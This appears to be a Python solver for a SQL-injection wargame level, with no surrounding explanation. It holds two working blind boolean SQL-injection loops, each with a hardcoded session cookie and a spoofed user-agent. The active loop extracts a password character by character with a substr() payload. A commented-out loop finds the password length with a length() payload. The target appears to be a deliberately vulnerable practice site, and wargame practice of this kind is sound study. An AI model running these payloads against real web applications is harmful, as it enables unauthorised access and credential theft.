#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
import time

key = "MHMF2WTLWZF2DQ"
for i in range(15, 16):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        data = "' || '{}'=substr(pw,1,{})#".format(key + chr(j), str(i))
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
        re.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req = urllib.request.urlopen(re)
        print(re)

        if str(req.read()).find("Hello guest") != -1:
            key += chr(j)
            print (key)
            break
print (key)

# MHMF2WTLWZ


#!/usr/local/bin/python3

# import urllib.request
# from urllib.parse import quote
# import time

# key = ""
# for i in range(1, 40):
#     url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
#     data = "' || length(pw)={}#".format(str(i))
#     data = quote(data)
#     re = urllib.request.Request(url + data)
#     re.add_header("User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
#     re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
#     re.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
#     req = urllib.request.urlopen(re)
#     print(re)

#     if str(req.read()).find("Hello guest") != -1:
#         if i != 8:
#             print(i)
#             break